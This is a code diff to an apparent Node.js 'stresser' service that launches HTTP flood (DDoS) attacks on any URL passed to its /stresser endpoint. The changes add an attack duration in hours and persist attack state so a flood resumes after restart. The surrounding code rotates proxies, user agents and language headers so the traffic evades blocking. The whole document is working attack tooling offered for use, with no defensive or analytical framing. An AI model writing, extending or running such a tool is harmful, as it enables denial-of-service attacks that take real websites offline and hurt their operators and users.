@@ -14,7 +14,7 @@ const stateFilePath = path.join(__dirname, 'attackState.json');
 
 const ensureStateFileExists = () => {
     if (!fs.existsSync(stateFilePath)) {
-        fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, requestsSent: 0, targetUrl: null }));
+        fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
     }
 };
 
@@ -29,14 +29,22 @@ const loadState = () => {
         return JSON.parse(data);
     } catch (error) {
         console.error(`Failed to read state file: ${error}`);
-        return { continueAttack: false, requestsSent: 0, targetUrl: null };
+        return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
     }
 };
 
 const initialState = loadState();
 let continueAttack = initialState.continueAttack;
-let requestsSent = initialState.requestsSent;
+let startTime = initialState.startTime;
+let duration = initialState.duration;
 let targetUrl = initialState.targetUrl;
+
+if (continueAttack && startTime && duration) {
+    const endTime = startTime + duration;
+    if (Date.now() > endTime) {
+        continueAttack = false;
+    }
+}
 
 const langHeaders = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -114,7 +122,7 @@ const loadProxies = () => {
 
 const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion) => {
     if (!continueAttack) return;
-    
+
     const headersForRequest = {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": sanitizeUA(getRandomElement(userAgents())),
@@ -209,12 +217,12 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
 };
 
 const updateState = () => {
-    saveState({ continueAttack, requestsSent, targetUrl });
+    saveState({ continueAttack, startTime, duration, targetUrl });
 };
 
 setInterval(updateState, 5000);
 
-const startAttack = (url) => {
+const startAttack = (url, durationHours) => {
     if (!url || !/^https?:\/\//.test(url)) {
         console.error("Invalid URL. Please provide a valid URL starting with http:// or https://");
         return;
@@ -228,12 +236,14 @@ const startAttack = (url) => {
 
     continueAttack = true;
     targetUrl = url;
-
+    startTime = Date.now();
+    duration = durationHours * 60 * 60 * 1000;
     const attackTimeout = setTimeout(() => {
-    }, (maxRequests / requestsPerSecond) * 1000);
+        continueAttack = false;
+    }, duration);
 
     const checkCompletion = (sentRequests) => {
-        if (sentRequests >= maxRequests) {
+        if (sentRequests >= maxRequests || Date.now() > startTime + duration) {
             clearTimeout(attackTimeout);
             continueAttack = false;
         }
@@ -254,11 +264,15 @@ const startAttack = (url) => {
 
 app.get("/stresser", (req, res) => {
     const url = req.query.url;
+    const durationHours = parseFloat(req.query.duration) || 1;
     if (!url || !/^https?:\/\//.test(url)) {
         return res.status(400).json({ error: "Invalid URL. Please provide a valid URL starting with http:// or https://." });
     }
+    if (isNaN(durationHours) || durationHours <= 0) {
+        return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
+    }
     targetUrl = url;
-    startAttack(targetUrl);
+    startAttack(targetUrl, durationHours);
     res.json({ message: "Starting DDOS ATTACK..." });
 });
 
@@ -267,6 +281,6 @@ app.listen(port, () => {
     console.log(rainbow(`API running on http://localhost:${port}`));
     if (continueAttack) {
         console.log(rainbow('Resuming previous attack...'));
-        startAttack(targetUrl);
+        startAttack(targetUrl, duration / (60 * 60 * 1000));
     }
 });
